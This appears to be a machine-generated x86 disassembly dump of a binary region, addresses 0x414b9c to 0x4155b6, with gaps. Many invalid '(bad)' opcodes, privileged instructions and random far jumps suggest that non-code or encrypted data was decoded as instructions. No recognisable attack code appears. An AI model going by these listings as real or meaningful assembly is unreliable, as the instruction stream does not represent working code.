  414b9c:	imul   DWORD PTR [edx]
  414b9e:	std    
  414b9f:	daa    
  414ba0:	fstp   TBYTE PTR [ebx-0x21]
  414ba3:	lea    ecx,[edi+0x2403ef6f]
  414ba9:	jg     0x414b8a
  414bab:	pusha  
  414bac:	xor    DWORD PTR [esi+edi*2+0x42],edi
  414bb0:	icebp  
  414bb1:	in     al,0xfc
  414bb3:	and    BYTE PTR [eax+eax*1+0x0],0x0
	...
  414c14:	add    BYTE PTR [eax],al
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	mov    al,ah
  414c24:	cmp    al,0xdf
  414c26:	sub    al,0xd8
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [ebx-0x72],al
  414c30:	pop    esp
  414c31:	pop    edi
  414c32:	or     BYTE PTR [edx-0x73a91a63],0xc
  414c39:	xchg   esp,eax
  414c3a:	icebp  
  414c3b:	call   0x54a4e654
  414c40:	mov    eax,edi
  414c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c43:	imul   eax,DWORD PTR [ecx+0x77],0xac0a70f9
  414c4a:	fcmovb st,st(0)
  414c4c:	adc    BYTE PTR [ecx],ch
  414c4e:	cmp    edx,0x25
  414c51:	or     al,0x96
  414c53:	xchg   ebp,eax
  414c54:	mov    eax,0xadc05e63
  414c59:	fst    QWORD PTR [eax+0x5ef46cd0]
  414c5f:	inc    edx
  414c60:	pop    eax
  414c61:	repz rcr BYTE PTR [ecx+0x31],cl
  414c65:	xchg   esp,eax
  414c66:	lods   al,BYTE PTR ds:[esi]
  414c67:	adc    eax,0x8d9822d4
  414c6c:	mov    esi,0xbac5ef5c
  414c71:	mov    WORD PTR [eax-0x1e0b0571],?
  414c77:	sahf   
  414c78:	sub    DWORD PTR ds:0x61976287,eax
  414c7e:	loope  0x414c2c
  414c80:	mov    ah,0xa6
  414c82:	mov    ebx,0x2d551f6e
  414c87:	shr    BYTE PTR [eax],0x1b
  414c8a:	(bad)
  414c8e:	sahf   
  414c8f:	arpl   WORD PTR [esi-0x7a],cx
  414c92:	(bad)
  414c96:	mov    eax,0xfc8b808c
  414c9b:	ret    
  414c9c:	je     0x414cca
  414c9e:	arpl   WORD PTR [edx],bx
  414ca0:	push   0xc03d3104
  414ca5:	test   al,ah
  414ca7:	mov    dl,0x92
  414ca9:	imul   esi,DWORD PTR ds:0x88494c55,0x909472d8
  414cb3:	es fwait
  414cb5:	shr    BYTE PTR [ebx-0xf],cl
  414cb8:	ins    BYTE PTR es:[edi],dx
  414cb9:	fistp  WORD PTR [eax+0x5]
  414cbc:	and    BYTE PTR [eax+ecx*8+0x1962043c],cl
  414cc3:	rol    DWORD PTR [ebx+0x10575de2],1
  414cc9:	inc    edi
  414cca:	cmp    esp,DWORD PTR [ebx]
  414ccc:	push   esi
  414ccd:	std    
  414cce:	into   
  414ccf:	loopne 0x414cef
  414cd1:	mov    dh,0xd5
  414cd3:	push   ds
  414cd4:	pop    eax
  414cd5:	cmp    BYTE PTR [edx],bh
  414cd7:	ds call 0xde7d:0xfffbe5ee
  414cdf:	sub    eax,DWORD PTR [edx-0x76]
  414ce2:	push   cs
  414ce3:	jbe    0x414d10
  414ce5:	mov    edi,0xd9c1e959
  414cea:	inc    ebp
  414ceb:	aaa    
  414cec:	mov    edx,0x27c911e7
  414cf1:	jecxz  0x414d56
  414cf3:	dec    esp
  414cf4:	mov    bl,0x29
  414cf6:	data16 add bh,BYTE PTR [edi+0x65]
  414cfa:	aam    0xef
  414cfc:	loopne 0x414ccb
  414cfe:	dec    eax
  414cff:	or     BYTE PTR [eax+0x811feac],bl
  414d05:	push   ss
  414d06:	dec    esi
  414d07:	adc    BYTE PTR [eax],al
  414d09:	mov    ch,0xc9
  414d0b:	jmp    0x414c8f
  414d0d:	push   es
  414d0e:	retf   0xea3
  414d11:	add    bl,BYTE PTR [esp+eax*2]
  414d14:	push   esp
  414d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d16:	cmp    eax,edi
  414d18:	inc    esp
  414d19:	inc    edx
  414d1a:	pop    ss
  414d1b:	out    dx,eax
  414d1c:	aam    0xbf
  414d1e:	mov    cl,0xeb
  414d20:	mov    esi,0x384d277
  414d25:	aaa    
  414d26:	aam    0x4f
  414d28:	mov    edi,0x1e8df784
  414d2d:	or     BYTE PTR [ebx+0x6e8499b9],cl
  414d33:	in     eax,dx
  414d34:	xor    eax,0x0
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi-0x492aebbb],ebp
  414da4:	xchg   edx,eax
  414da5:	cmp    DWORD PTR [ebx],esi
  414da7:	fld    DWORD PTR [eax]
  414da9:	add    BYTE PTR [edi],al
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [ebx-0x2fd83770],ch
  414db3:	dec    edx
  414db4:	push   edi
  414db5:	mov    al,ds:0x525969ae
  414dba:	pop    esp
  414dbb:	loop   0x414e0b
  414dbd:	aas    
  414dbe:	inc    esp
  414dbf:	xor    ebp,DWORD PTR [ebx-0x1e]
  414dc2:	mov    edi,0x929df18e
  414dc7:	inc    edx
  414dc8:	add    BYTE PTR [ecx-0x148e28c8],ch
  414dce:	adc    BYTE PTR [esi+0x24],bh
  414dd1:	loope  0x414d5e
  414dd3:	(bad)  
  414dd4:	jg     0x414db9
  414dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dd7:	mov    esi,0xc795cfb5
  414ddc:	or     eax,0x3ad6995b
  414de2:	cdq    
  414de3:	push   eax
  414de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de5:	out    dx,eax
  414de6:	dec    esp
  414de7:	mov    WORD PTR [edi-0x151bb16e],fs
  414ded:	test   al,0x7
  414def:	cmp    al,0x89
  414df1:	xor    eax,0x76eb4acd
  414df6:	pop    ds
  414df7:	popa   
  414df8:	sub    DWORD PTR [ebp+0x30],0xee35b0ba
  414dff:	pop    esi
  414e00:	fwait
  414e01:	mov    dl,0xe4
  414e03:	and    al,0x4f
  414e05:	cwde   
  414e06:	xlat   BYTE PTR ds:[ebx]
  414e07:	adc    DWORD PTR [ecx],ebx
  414e09:	adc    BYTE PTR [esi],dh
  414e0b:	lods   al,BYTE PTR ds:[esi]
  414e0c:	repz daa 
  414e0e:	fisubr DWORD PTR [eax-0x47]
  414e11:	sbb    cl,dh
  414e13:	aaa    
  414e14:	vpsubb ymm1{k7}{z},ymm1,DWORD PTR [eax]{1to8}
  414e1a:	inc    eax
  414e1b:	mov    ah,0xc8
  414e1d:	cmc    
  414e1e:	jmp    0x229f:0xafd5afb8
  414e25:	ret    
  414e26:	sub    al,0xa4
  414e28:	xchg   BYTE PTR [edi-0x42353207],ch
  414e2e:	dec    esp
  414e2f:	out    dx,eax
  414e30:	imul   edx,DWORD PTR [esi],0xf735ee45
  414e36:	sub    cl,BYTE PTR [edi]
  414e38:	push   esp
  414e39:	pop    edx
  414e3a:	mov    bh,0xa5
  414e3c:	mov    bl,0x6e
  414e3e:	not    BYTE PTR [ecx+0x7]
  414e41:	ins    BYTE PTR es:[edi],dx
  414e42:	sub    BYTE PTR [edx+0x4a],cl
  414e45:	aaa    
  414e46:	std    
  414e47:	cwde   
  414e48:	push   0x79
  414e4a:	and    al,0x55
  414e4c:	xor    ebx,edx
  414e4e:	popf   
  414e4f:	out    dx,eax
  414e50:	push   ebx
  414e51:	xchg   esp,eax
  414e52:	cli    
  414e53:	sub    BYTE PTR [edi+esi*4+0x7262bf47],cl
  414e5a:	lea    ecx,[edi]
  414e5c:	scas   al,BYTE PTR es:[edi]
  414e5d:	out    dx,eax
  414e5e:	or     BYTE PTR [ebp-0x76],0x90
  414e62:	jns    0x414ed7
  414e64:	loope  0x414e08
  414e66:	cmp    BYTE PTR [esi-0x60b2aae1],dh
  414e6c:	mov    cl,0xce
  414e6e:	neg    DWORD PTR [esi+0x44]
  414e71:	test   eax,0xfc072dec
  414e76:	adc    DWORD PTR [esi],esp
  414e78:	stc    
  414e79:	out    0x77,eax
  414e7b:	fucom  st(2)
  414e7d:	lahf   
  414e7e:	ds pusha 
  414e80:	in     eax,0xf8
  414e82:	lahf   
  414e83:	ins    DWORD PTR es:[edi],dx
  414e84:	sub    BYTE PTR [eax],0x46
  414e87:	xchg   esi,eax
  414e88:	inc    ecx
  414e89:	pop    edx
  414e8a:	loopne 0x414e74
  414e8c:	push   ecx
  414e8d:	rcr    esp,cl
  414e8f:	or     al,0x8f
  414e91:	movntq QWORD PTR [ebp-0x5d],mm3
  414e95:	dec    esi
  414e96:	pop    esi
  414e97:	push   0x3e07dbd7
  414e9c:	enter  0x6fc9,0xe7
  414ea0:	add    bl,BYTE PTR [ebp+esi*1+0x22947b65]
  414ea7:	adc    eax,0xf01c842f
  414eac:	out    0x38,al
  414eae:	sub    DWORD PTR [edx+0x730b6d9],0x10
	...
  414f15:	add    BYTE PTR [edi],dh
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	ret    0x161c
  414f25:	push   esi
  414f26:	cmp    bl,dl
  414f28:	add    BYTE PTR [eax],al
  414f2a:	pop    es
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    bl,dl
  414f2f:	in     al,dx
  414f30:	ss gs pop ebp
  414f33:	jnp    0x414f25
  414f35:	mov    ds:0x5eb79342,eax
  414f3a:	mov    edi,0x9fbb099a
  414f3f:	xor    bh,BYTE PTR [edi-0x21]
  414f42:	lods   al,BYTE PTR ds:[esi]
  414f43:	pop    edi
  414f44:	emms   
  414f46:	mov    ds:0xeff0c8d4,eax
  414f4b:	pop    es
  414f4c:	in     eax,0x70
  414f4e:	std    
  414f4f:	mov    esp,DWORD PTR [edi-0x34]
  414f52:	jmp    0xed353181
  414f57:	stos   DWORD PTR es:[edi],eax
  414f58:	mov    eax,cs
  414f5a:	inc    eax
  414f5b:	inc    ebp
  414f5c:	mov    edx,DWORD PTR [edx+0x447cab83]
  414f62:	mov    esp,0xfd0f9396
  414f67:	loopne 0x414fd9
  414f69:	fwait
  414f6a:	lock mov eax,0x13211085
  414f70:	ret    0x5a4a
  414f73:	in     al,0x4
  414f75:	data16 gs mov dl,0x11
  414f79:	pop    edx
  414f7a:	push   0x3b
  414f7c:	inc    ecx
  414f7d:	stc    
  414f7e:	(bad)  
  414f7f:	cmp    dl,BYTE PTR [edi-0x3dab91d4]
  414f85:	stc    
  414f86:	push   0xec2e4658
  414f8b:	push   ebx
  414f8c:	std    
  414f8d:	loopne 0x414f24
  414f8f:	push   edi
  414f90:	scas   eax,DWORD PTR es:[edi]
  414f91:	inc    esi
  414f92:	into   
  414f93:	inc    ecx
  414f94:	and    bh,0xac
  414f97:	js     0x414fff
  414f99:	and    al,0x15
  414f9b:	xchg   esi,eax
  414f9c:	iret   
  414f9d:	retf   0xd123
  414fa0:	icebp  
  414fa1:	mov    eax,ds:0xea051d30
  414fa6:	push   cs
  414fa7:	mov    ecx,0xe63ac5af
  414fac:	rol    DWORD PTR [edi+0x29a9d32f],0x49
  414fb3:	cmp    ch,BYTE PTR es:[edi+0x13]
  414fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb8:	scas   eax,DWORD PTR es:[edi]
  414fb9:	mov    dh,0x3
  414fbb:	shr    ebp,1
  414fbd:	enter  0x297,0xa1
  414fc1:	or     eax,0x6855bf42
  414fc6:	jmp    0x414f62
  414fc8:	lock out 0x49,al
  414fcb:	stos   DWORD PTR es:[edi],eax
  414fcc:	xchg   esp,eax
  414fcd:	jae    0x414f65
  414fcf:	pushf  
  414fd0:	push   ds
  414fd1:	jbe    0x414f6d
  414fd3:	sti    
  414fd4:	push   esi
  414fd5:	sub    eax,0xd0de59b7
  414fda:	add    dh,BYTE PTR [eax-0xe73044d]
  414fe0:	mov    edx,0xa2ae11d3
  414fe5:	std    
  414fe6:	mov    bl,0x9b
  414fe8:	shl    DWORD PTR [ebp+0x164e8c90],cl
  414fee:	test   dh,0x65
  414ff1:	add    BYTE PTR ds:0xd7f40ad6,al
  414ff7:	mov    ebx,0x9661455f
  414ffc:	push   0xfdfe3d44
  415001:	arpl   WORD PTR [esi],ax
  415003:	xor    BYTE PTR [eax-0xa260a7f],cl
  415009:	inc    edi
  41500a:	(bad)  [eax+ebp*1+0x43]
  41500e:	push   ss
  41500f:	xor    eax,0x8a43856e
  415014:	rcr    DWORD PTR [esi-0x78],cl
  415017:	ss jnp 0x415045
  41501a:	enter  0x246b,0x44
  41501e:	mov    cl,0x14
  415020:	in     eax,dx
  415021:	repz and eax,0xd2bbb0e9
  415027:	xor    al,0x95
  415029:	leave  
  41502a:	cmp    cl,ah
  41502c:	outs   dx,DWORD PTR ds:[esi]
  41502d:	int3   
  41502e:	(bad)  
  41502f:	cmp    esp,DWORD PTR [ebx-0x50]
  415032:	mov    eax,ds:0xe1d5
	...
  415093:	add    BYTE PTR [eax],al
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xc624f78f
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    ah,ch
  4150af:	xor    ebx,DWORD PTR [ecx]
  4150b1:	pop    edi
  4150b2:	push   ss
  4150b3:	jno    0x4150a1
  4150b5:	outs   dx,DWORD PTR ds:[esi]
  4150b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b7:	push   ss
  4150b8:	into   
  4150b9:	push   eax
  4150ba:	add    esp,esp
  4150bc:	mov    ecx,0x5731b170
  4150c1:	pushf  
  4150c2:	adc    eax,0x627a3963
  4150c7:	xchg   BYTE PTR [edi],ch
  4150c9:	repz inc esi
  4150cb:	lock inc ecx
  4150cd:	sbb    bl,BYTE PTR [ebx]
  4150cf:	mov    DWORD PTR [eax-0x7a8ad395],ebx
  4150d5:	jmp    FWORD PTR [edi-0x29fe46e4]
  4150db:	stos   DWORD PTR es:[edi],eax
  4150dc:	fsubr  DWORD PTR [eax]
  4150de:	hlt    
  4150df:	jle    0x4150cf
  4150e1:	test   DWORD PTR [ecx],eax
  4150e3:	je     0x4150a8
  4150e5:	pushf  
  4150e6:	mov    es,WORD PTR [edx+0x62122eb]
  4150ec:	popa   
  4150ed:	pop    eax
  4150ee:	pop    ebp
  4150ef:	pop    ebp
  4150f0:	lahf   
  4150f1:	std    
  4150f2:	xchg   ecx,eax
  4150f3:	or     eax,0xaccc0d71
  4150f8:	call   0x315431a5
  4150fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150fe:	jne    0x415103
  415100:	xchg   ebx,eax
  415101:	push   0x21
  415103:	clc    
  415104:	push   edi
  415105:	jne    0x4150f8
  415107:	inc    ecx
  415108:	(bad)  
  415109:	rcl    BYTE PTR [edi+esi*8-0x3ea591eb],1
  415110:	jge    0x4150c8
  415112:	push   eax
  415113:	and    DWORD PTR [ecx+0x58],esi
  415116:	loop   0x4150a6
  415118:	push   eax
  415119:	nop
  41511a:	or     dh,BYTE PTR [esi+ebp*8-0xf36afe9]
  415121:	in     al,0xaf
  415123:	jecxz  0x415184
  415125:	mov    bh,0x76
  415127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415128:	(bad)  
  41512a:	scas   eax,DWORD PTR es:[edi]
  41512b:	ds push cs
  41512d:	fisttp WORD PTR [esp+esi*4]
  415130:	scas   al,BYTE PTR es:[edi]
  415131:	add    ebp,eax
  415133:	(bad)  
  415134:	retf   0x26d7
  415137:	pop    es
  415138:	retf   
  415139:	jbe    0x4151af
  41513b:	test   BYTE PTR [edx-0x30],dl
  41513e:	es pop esp
  415140:	inc    eax
  415141:	dec    ecx
  415142:	xor    esp,DWORD PTR [eax]
  415144:	push   cs
  415145:	mov    eax,0x17b1341a
  41514a:	and    al,0x34
  41514c:	and    DWORD PTR [ebp-0x2e24ed77],esp
  415152:	fmul   st,st(7)
  415154:	gs pusha 
  415156:	inc    edi
  415157:	iret   
  415158:	mov    esi,0xd2ffcaf9
  41515d:	inc    ebx
  41515e:	jecxz  0x4150e6
  415160:	xlat   BYTE PTR ds:[ebx]
  415161:	cmp    bh,BYTE PTR [ebx-0x17]
  415164:	or     bh,BYTE PTR [edx+0x33bf4950]
  41516a:	jo     0x41510e
  41516c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41516d:	jno    0x4151cc
  41516f:	out    dx,al
  415170:	jmp    0x4805ac21
  415175:	shl    BYTE PTR [edi],1
  415177:	pop    es
  415178:	(bad)  
  415179:	iret   
  41517a:	cmp    eax,0xcd7598df
  41517f:	sub    DWORD PTR [ecx],esi
  415181:	dec    eax
  415182:	dec    eax
  415183:	mov    edi,DWORD PTR [eiz*1-0x3b24dde]
  41518a:	jl     0x4151d9
  41518c:	push   ecx
  41518d:	repz scas al,BYTE PTR es:[edi]
  41518f:	and    DWORD PTR [edi+0x17],edi
  415192:	aad    0xeb
  415194:	sub    DWORD PTR [eax+ecx*2],ebx
  415197:	inc    ecx
  415198:	adc    BYTE PTR [edi-0x31],al
  41519b:	clc    
  41519c:	cmp    ebx,esi
  41519e:	addr16 sti 
  4151a0:	nop
  4151a1:	sahf   
  4151a2:	es push cs
  4151a4:	ja     0x4151d1
  4151a6:	ret    
  4151a7:	pop    edx
  4151a8:	adc    dh,dh
  4151aa:	scas   eax,DWORD PTR es:[edi]
  4151ab:	xor    edx,DWORD PTR [ebx+0x21db931c]
  4151b1:	inc    eax
  4151b2:	push   ecx
  4151b3:	(bad)  [eax+0x0]
	...
  415216:	sub    al,0x97
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x31
  415223:	push   edx
  415224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415225:	and    cl,BYTE PTR [eax-0x24]
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    cl,ah
  41522f:	or     ebp,ebx
  415231:	push   edx
  415232:	xchg   ecx,eax
  415233:	cli    
  415234:	into   
  415235:	mov    esp,0x54363d22
  41523a:	mov    bh,0xa3
  41523c:	jl     0x41528a
  41523e:	and    dl,BYTE PTR [edx]
  415240:	loop   0x415244
  415242:	cmp    al,BYTE PTR [edi-0x102f9604]
  415248:	in     eax,0x61
  41524a:	mov    ah,0xcc
  41524c:	dec    ecx
  41524d:	mov    dl,0x90
  41524f:	fcmovu st,st(4)
  415251:	or     edi,DWORD PTR [ebx+0x92cc15d]
  415257:	in     eax,dx
  415258:	dec    edx
  415259:	cmp    al,0x56
  41525b:	add    bh,BYTE PTR [esi+0x2a]
  41525e:	mov    ebp,ds
  415260:	fldenv [eax-0x56]
  415263:	scas   al,BYTE PTR es:[edi]
  415264:	cmp    ebx,DWORD PTR [esi+0x75]
  415267:	lods   al,BYTE PTR ds:[esi]
  415268:	out    dx,eax
  415269:	fistp  DWORD PTR [eax+0x33c8c114]
  41526f:	sub    ebx,DWORD PTR [edi]
  415271:	cmp    al,BYTE PTR [eax+ecx*8+0x7a]
  415275:	jmp    DWORD PTR [ecx+0x7ca868c1]
  41527b:	rcl    DWORD PTR [ecx+0x3fce1a82],1
  415281:	mov    edi,0x94f0b93c
  415286:	sub    DWORD PTR [edx],ebp
  415288:	jl     0x4152bb
  41528a:	bound  ebp,QWORD PTR [esp+ebp*2]
  41528d:	mov    bl,0xad
  41528f:	aam    0x58
  415291:	pop    esi
  415292:	ins    DWORD PTR es:[edi],dx
  415293:	jnp    0x4152fe
  415295:	mov    esp,0xc0f09fb2
  41529a:	cmp    dl,BYTE PTR [eax-0x7a15aa27]
  4152a0:	sub    al,0xf6
  4152a2:	push   es
  4152a3:	mov    dh,0x3b
  4152a5:	fadd   DWORD PTR [esi]
  4152a7:	in     eax,0x95
  4152a9:	arpl   bp,dx
  4152ab:	jne    0x41524a
  4152ad:	or     dl,0xc6
  4152b0:	dec    ecx
  4152b1:	pop    ecx
  4152b2:	jg     0x4152f6
  4152b4:	mov    ebx,0x772507f
  4152b9:	or     ebx,esi
  4152bb:	pop    ebp
  4152bc:	in     eax,0xe8
  4152be:	mov    edi,0xfc74d632
  4152c3:	fcom   QWORD PTR [edi]
  4152c5:	(bad)  
  4152c6:	rcl    ch,cl
  4152c8:	sbb    ecx,edi
  4152ca:	jg     0x41530d
  4152cc:	push   0x46dd88e1
  4152d1:	adc    BYTE PTR ds:0x880b17c9,dl
  4152d7:	cmp    BYTE PTR [ecx+0x24336869],al
  4152dd:	ds sub eax,0x5f058532
  4152e3:	out    dx,eax
  4152e4:	(bad)  
  4152e5:	not    DWORD PTR [eax-0x6f]
  4152e8:	adc    DWORD PTR [ecx-0xa],edi
  4152eb:	push   0xfffffffa
  4152ed:	mov    ch,0x8c
  4152ef:	aas    
  4152f0:	sbb    BYTE PTR [edx-0x57],dh
  4152f3:	pop    eax
  4152f4:	push   ecx
  4152f5:	pushf  
  4152f6:	adc    dl,BYTE PTR [ebx-0x3e]
  4152f9:	mov    ch,0xad
  4152fb:	fsubr  QWORD PTR [edx-0x4a4fa3b2]
  415301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415302:	xor    ebp,DWORD PTR [esi]
  415304:	mov    eax,0xb2437b32
  415309:	xor    bh,dl
  41530b:	mov    bh,0xa1
  41530d:	sbb    ebp,ebx
  41530f:	mov    al,0x75
  415311:	pop    ecx
  415312:	in     eax,dx
  415313:	pop    eax
  415314:	sub    ebp,DWORD PTR [esi+0x52]
  415317:	dec    edx
  415318:	add    ebp,DWORD PTR [edi+eiz*8]
  41531b:	lea    ebp,[ebp+edi*2-0x7]
  41531f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415320:	inc    ebx
  415321:	shr    edi,cl
  415323:	jno    0x415330
  415325:	jmp    0xf8d4:0x5f4d9c3b
  41532c:	xor    ecx,DWORD PTR [esi-0x24]
  41532f:	jecxz  0x415382
  415331:	mov    eax,0x52dc99
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x2c4b9b2a
  4153a3:	lahf   
  4153a4:	dec    edi
  4153a5:	ret    0xdd4f
  4153a8:	add    BYTE PTR [eax],al
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ecx],al
  4153af:	or     al,0xf4
  4153b1:	mov    BYTE PTR [ebx-0x247ca2c3],ch
  4153b7:	and    BYTE PTR [edx+edi*2+0x6e743036],dl
  4153be:	pop    esi
  4153bf:	out    dx,eax
  4153c0:	adc    DWORD PTR [edx],ebp
  4153c2:	xchg   edx,eax
  4153c3:	cmp    al,0xd8
  4153c5:	and    al,0x38
  4153c8:	inc    edx
  4153c9:	retf   
  4153ca:	dec    esp
  4153cb:	push   cs
  4153cc:	dec    ecx
  4153cd:	int3   
  4153ce:	jp     0x41538a
  4153d0:	jp     0x415377
  4153d2:	clc    
  4153d3:	push   0x70
  4153d5:	mov    dh,BYTE PTR ds:0xdbb30564
  4153db:	or     esp,DWORD PTR [bx+si]
  4153de:	cmovno esp,DWORD PTR [edx]
  4153e1:	cmp    ebp,eax
  4153e3:	(bad)  
  4153e4:	xor    al,0x6d
  4153e6:	not    BYTE PTR [ebp-0x5a]
  4153e9:	and    eax,0x2fc171b8
  4153ee:	scas   al,BYTE PTR es:[edi]
  4153ef:	ret    0xa856
  4153f2:	sub    esp,DWORD PTR [eax-0x266fda7]
  4153f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153f9:	ins    DWORD PTR es:[di],dx
  4153fb:	mov    ds:0x17890e5,eax
  415400:	jnp    0x415409
  415402:	cmp    ah,dl
  415404:	jp     0x4153ce
  415406:	add    eax,0x400a0603
  41540b:	add    al,0xc5
  41540d:	in     eax,dx
  41540e:	sti    
  41540f:	ficom  WORD PTR [edx]
  415411:	adc    edx,DWORD PTR [edx]
  415413:	push   0x79
  415415:	sbb    bh,0x73
  415418:	jl     0x4153c6
  41541a:	sahf   
  41541b:	mov    dh,0x1a
  41541d:	lock (bad) 
  41541f:	push   ss
  415420:	xchg   esp,eax
  415421:	push   ebp
  415422:	and    bh,bl
  415424:	das    
  415425:	jl     0x41542a
  415427:	and    DWORD PTR [edi+0x6aa8095],esp
  41542d:	dec    edi
  41542e:	xor    al,0x96
  415430:	gs jbe 0x41548d
  415433:	jne    0x41547b
  415435:	(bad)  
  415436:	(bad)  
  415437:	cmp    dl,BYTE PTR [ecx-0x17ab010d]
  41543d:	mov    ds:0xcec2211c,al
  415442:	cmp    DWORD PTR es:[esi],esp
  415445:	cdq    
  415446:	xor    edi,DWORD PTR [edi-0x16]
  415449:	cmp    ebx,DWORD PTR [eax]
  41544b:	inc    ecx
  41544c:	xchg   esi,eax
  41544d:	dec    esp
  41544e:	psllq  mm3,mm0
  415451:	stos   DWORD PTR es:[edi],eax
  415452:	push   ebx
  415453:	out    dx,eax
  415454:	fsubr  DWORD PTR [ebp-0x7f1ab797]
  41545a:	imul   eax,DWORD PTR [edx],0x51
  41545d:	(bad)  
  41545e:	ds dec dh
  415461:	push   ds
  415462:	pop    edx
  415463:	scas   al,BYTE PTR es:[edi]
  415464:	mov    ds:0x5e8af20e,eax
  415469:	cmp    BYTE PTR [ebx],al
  41546b:	mov    bl,0xc8
  41546d:	inc    ecx
  41546e:	mov    edx,0x7603958e
  415473:	lods   eax,DWORD PTR ds:[esi]
  415474:	jecxz  0x41546c
  415476:	jl     0x4154a7
  415478:	in     al,dx
  415479:	rol    DWORD PTR [esi+0x184cd4c5],1
  41547f:	or     al,0x32
  415481:	inc    edx
  415482:	mov    dl,0xe6
  415484:	aad    0x34
  415486:	xchg   esp,eax
  415487:	xchg   esi,eax
  415488:	popa   
  415489:	push   0x13fcd80e
  41548e:	mov    fs,WORD PTR [ebp-0x2df848d4]
  415494:	call   0x2b0b:0x501d2400
  41549b:	pop    eax
  41549c:	dec    esi
  41549d:	xor    BYTE PTR [edx+0x4516b835],al
  4154a3:	popf   
  4154a4:	mov    cl,BYTE PTR [eax+0x6f]
  4154a7:	inc    DWORD PTR [ebx]
  4154a9:	retf   
  4154aa:	nop
  4154ab:	enter  0x1fba,0xd
  4154af:	loopne 0x41548b
  4154b1:	into   
  4154b2:	fdivr  QWORD PTR [ecx+ecx*1+0x0]
	...
  415516:	in     al,0xf0
  415518:	sub    DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	jno    0x4154cb
  415524:	ds pushf 
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    al,ch
  41552f:	xor    DWORD PTR [eax],edx
  415531:	stos   BYTE PTR es:[edi],al
  415532:	mov    esp,DWORD PTR [ecx+0x37c971cb]
  415538:	and    al,0xc7
  41553a:	or     BYTE PTR [ebx],ch
  41553c:	fld    QWORD PTR [ecx-0x4f]
  41553f:	scas   al,BYTE PTR es:[edi]
  415540:	pop    es
  415541:	sti    
  415542:	and    al,0x84
  415544:	jnp    0x41556c
  415546:	xlat   BYTE PTR ds:[ebx]
  415547:	shl    DWORD PTR [edx],cl
  415549:	inc    edi
  41554a:	cmp    al,0x47
  41554c:	pusha  
  41554d:	repz cdq 
  41554f:	aaa    
  415550:	xchg   ecx,eax
  415551:	mov    ebx,0x6f5b676b
  415556:	rcr    ecx,0x81
  415559:	push   esi
  41555a:	and    bh,bl
  41555c:	and    eax,0xd14cce10
  415561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415562:	hlt    
  415563:	out    dx,al
  415564:	lea    esi,[edx-0x3]
  415567:	ret    
  415568:	xchg   DWORD PTR [eax],edx
  41556a:	pop    edx
  41556b:	adc    DWORD PTR [esp+edx*4+0x61fbd5f7],eax
  415572:	cmp    DWORD PTR [edx+0x32f8f98a],edx
  415578:	rol    BYTE PTR [ebx],1
  41557a:	xor    al,BYTE PTR [edx]
  41557c:	dec    esi
  41557d:	loop   0x41558d
  41557f:	jb     0x415522
  415581:	jge    0x41550d
  415583:	push   DWORD PTR ds:0xdc3dbce9
  415589:	ins    BYTE PTR es:[edi],dx
  41558a:	lods   eax,DWORD PTR ds:[esi]
  41558b:	mov    dh,0xc8
  41558d:	and    eax,0x8fc6e48f
  415592:	jno    0x415541
  415594:	or     ah,al
  415596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415597:	xchg   BYTE PTR [eax+ebp*8],al
  41559a:	stc    
  41559b:	and    ebp,DWORD PTR [ecx]
  41559d:	gs push ss
  41559f:	loope  0x41557f
  4155a1:	cwde   
  4155a2:	mov    ebp,0xe88c16fd
  4155a7:	call   0x520653f3
  4155ac:	adc    BYTE PTR [ebp+0x301e7d8f],ah
  4155b2:	jecxz  0x415542
  4155b4:	adc    ah,ah
  4155b6:	cmp    al,0xf6
